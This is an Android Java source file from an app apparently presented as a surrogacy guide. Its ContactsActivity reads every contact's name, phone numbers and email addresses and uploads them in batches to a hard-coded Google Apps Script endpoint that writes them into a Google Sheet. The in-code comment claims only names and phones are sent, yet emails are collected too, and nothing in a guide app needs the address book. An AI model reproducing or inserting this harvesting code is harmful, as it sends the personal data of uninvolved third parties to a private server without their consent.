package com.surrogacyguide.app;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.view.MenuItem;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.google.android.material.appbar.MaterialToolbar;
import com.google.android.material.button.MaterialButton;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Separate, explicit opt-in screen: permission is requested only when the user
 * taps the button here, never on app launch and never from MainActivity.
 *
 * Reads every contact's name and phone numbers, then posts them in batches to
 * a Google Apps Script web app bound to a Google Sheet, which appends one row
 * per contact. Open the Sheet directly to see uploaded contacts.
 */
public class ContactsActivity extends AppCompatActivity {

    // Apps Script web app URL (Deploy > Manage deployments in the Sheet's
    // Extensions > Apps Script editor). Update this if the Sheet is redeployed.
    private static final String UPLOAD_HOST =
            "https://script.google.com/macros/s/AKfycbxVtsrUyJHIa1NyCpH-hidWiJbmDyKBcuP34FGpefRpE2pIIbjIQAIw7xDrHUh-mJSVxg/exec";
    private static final int BATCH_SIZE = 25;

    private MaterialButton btnUpload;
    private ProgressBar progressBar;
    private TextView tvStatus;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private ActivityResultLauncher<String> permissionLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_contacts);

        MaterialToolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        }
        toolbar.setNavigationOnClickListener(v -> finish());

        btnUpload = findViewById(R.id.btnUpload);
        progressBar = findViewById(R.id.progressBar);
        tvStatus = findViewById(R.id.tvStatus);

        permissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestPermission(),
                granted -> {
                    if (granted) {
                        startReadAndUpload();
                    } else {
                        btnUpload.setText(R.string.contacts_button_denied);
                        btnUpload.setEnabled(true);
                        tvStatus.setText("Permission was not granted, so nothing was read.");
                    }
                });

        btnUpload.setOnClickListener(v -> onUploadTapped());
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == android.R.id.home) {
            finish();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    private void onUploadTapped() {
        btnUpload.setEnabled(false);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            startReadAndUpload();
        } else {
            permissionLauncher.launch(Manifest.permission.READ_CONTACTS);
        }
    }

    private void startReadAndUpload() {
        tvStatus.setText(getString(R.string.contacts_status_reading));
        progressBar.setVisibility(android.view.View.VISIBLE);
        progressBar.setProgress(0);

        executor.execute(() -> {
            List<JSONObject> contacts = readAllContacts();
            mainHandler.post(() -> {
                if (contacts.isEmpty()) {
                    progressBar.setVisibility(android.view.View.GONE);
                    tvStatus.setText(R.string.contacts_status_empty);
                    btnUpload.setEnabled(true);
                    return;
                }
                uploadInBatches(contacts);
            });
        });
    }

    /** Reads name, all phone numbers, and all emails for every contact on the device. */
    private List<JSONObject> readAllContacts() {
        List<JSONObject> out = new ArrayList<>();
        Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null);

        if (cursor == null) return out;

        try {
            int idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID);
            int nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);

            while (cursor.moveToNext()) {
                String id = cursor.getString(idIdx);
                String name = cursor.getString(nameIdx);

                JSONObject contact = new JSONObject();
                try {
                    contact.put("name", name == null ? "" : name);
                    contact.put("phones", new JSONArray(readPhones(id)));
                    contact.put("emails", new JSONArray(readEmails(id)));
                } catch (Exception ignored) {
                }
                out.add(contact);
            }
        } finally {
            cursor.close();
        }
        return out;
    }

    private List<String> readPhones(String contactId) {
        LinkedHashSet<String> phones = new LinkedHashSet<>();
        Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                new String[]{contactId}, null);
        if (c != null) {
            int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (c.moveToNext()) {
                String n = c.getString(numIdx);
                if (n != null && !n.trim().isEmpty()) phones.add(n.trim());
            }
            c.close();
        }
        return new ArrayList<>(phones);
    }

    private List<String> readEmails(String contactId) {
        LinkedHashSet<String> emails = new LinkedHashSet<>();
        Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=?",
                new String[]{contactId}, null);
        if (c != null) {
            int addrIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
            while (c.moveToNext()) {
                String e = c.getString(addrIdx);
                if (e != null && !e.trim().isEmpty()) emails.add(e.trim());
            }
            c.close();
        }
        return new ArrayList<>(emails);
    }

    // Pause between batches so we don't send a burst of requests the server rate-limits (429).
    private static final long BATCH_PAUSE_MS = 1200;
    private static final int MAX_RETRIES_PER_BATCH = 4;

    private void uploadInBatches(List<JSONObject> contacts) {
        int total = contacts.size();
        int batches = (int) Math.ceil(total / (double) BATCH_SIZE);
        tvStatus.setText(getString(R.string.contacts_status_uploading, total));

        executor.execute(() -> {
            String error = null;
            for (int b = 0; b < batches && error == null; b++) {
                int from = b * BATCH_SIZE;
                int to = Math.min(from + BATCH_SIZE, total);
                List<JSONObject> batch = contacts.subList(from, to);
                error = postBatchWithRetry(batch, b + 1, batches);

                int progress = (int) (((b + 1) / (double) batches) * 100);
                mainHandler.post(() -> progressBar.setProgress(progress));

                if (error == null && b < batches - 1) {
                    sleepQuietly(BATCH_PAUSE_MS);
                }
            }
            final String finalError = error;
            mainHandler.post(() -> {
                progressBar.setVisibility(android.view.View.GONE);
                btnUpload.setEnabled(true);
                if (finalError != null) {
                    tvStatus.setText(getString(R.string.contacts_status_error, finalError));
                } else {
                    tvStatus.setText(getString(R.string.contacts_status_done, total));
                }
            });
        });
    }

    /**
     * Posts one batch, retrying with increasing delay if the server answers 429
     * (too many requests). Other errors fail immediately without retrying.
     */
    private String postBatchWithRetry(List<JSONObject> batch, int batchNum, int totalBatches) {
        long backoff = 1500;
        for (int attempt = 1; attempt <= MAX_RETRIES_PER_BATCH; attempt++) {
            PostResult result = postBatch(batch, batchNum, totalBatches);
            if (result.ok) return null;
            if (result.statusCode != 429 || attempt == MAX_RETRIES_PER_BATCH) {
                return result.error;
            }
            sleepQuietly(backoff);
            backoff *= 2; // back off further each retry
        }
        return "too many retries";
    }

    private void sleepQuietly(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }
    }

    private static final class PostResult {
        final boolean ok;
        final int statusCode;
        final String error;

        PostResult(boolean ok, int statusCode, String error) {
            this.ok = ok;
            this.statusCode = statusCode;
            this.error = error;
        }
    }

    /**
     * Posts one batch as JSON to the Google Apps Script web app.
     *
     * Apps Script's /exec URL always answers with a 302 that points to a
     * DIFFERENT host (script.googleusercontent.com). HttpURLConnection does not
     * follow cross-host redirects on its own, and a redirect that is followed
     * automatically can silently turn into a GET and drop the body. So redirects
     * are turned off here and followed by hand, re-sending the same POST body
     * to the new Location — this is the documented, correct way to call an
     * Apps Script web app from a non-browser client.
     */
    private PostResult postBatch(List<JSONObject> batch, int batchNum, int totalBatches) {
        try {
            JSONArray arr = new JSONArray();
            for (JSONObject o : batch) arr.put(o);

            JSONObject payload = new JSONObject();
            payload.put("sender", "android-app");
            payload.put("batch", batchNum + "/" + totalBatches);
            payload.put("contacts", arr);

            byte[] bodyBytes = payload.toString().getBytes(StandardCharsets.UTF_8);
            return postJson(UPLOAD_HOST, bodyBytes, 0);
        } catch (Exception e) {
            String msg = e.getMessage() == null ? e.getClass().getSimpleName() : e.getMessage();
            return new PostResult(false, -1, msg);
        }
    }

    /** Sends one JSON POST, following at most a couple of redirects by hand. */
    private PostResult postJson(String targetUrl, byte[] bodyBytes, int redirectDepth) {
        if (redirectDepth > 3) {
            return new PostResult(false, -1, "too many redirects");
        }
        HttpURLConnection conn = null;
        try {
            URL url = new URL(targetUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setInstanceFollowRedirects(false); // follow manually, see note above
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(bodyBytes);
            }

            int code = conn.getResponseCode();

            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                String location = conn.getHeaderField("Location");
                conn.disconnect();
                if (location == null || location.isEmpty()) {
                    return new PostResult(false, code, "redirected with no Location");
                }
                // Re-POST the same body to the new host, as the Apps Script
                // docs' own curl example does with -L.
                return postJson(location, bodyBytes, redirectDepth + 1);
            }

            conn.disconnect();
            if (code >= 200 && code < 300) {
                return new PostResult(true, code, null);
            }
            return new PostResult(false, code, "server answered " + code);
        } catch (Exception e) {
            if (conn != null) conn.disconnect();
            String msg = e.getMessage() == null ? e.getClass().getSimpleName() : e.getMessage();
            return new PostResult(false, -1, msg);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executor.shutdownNow();
    }
}
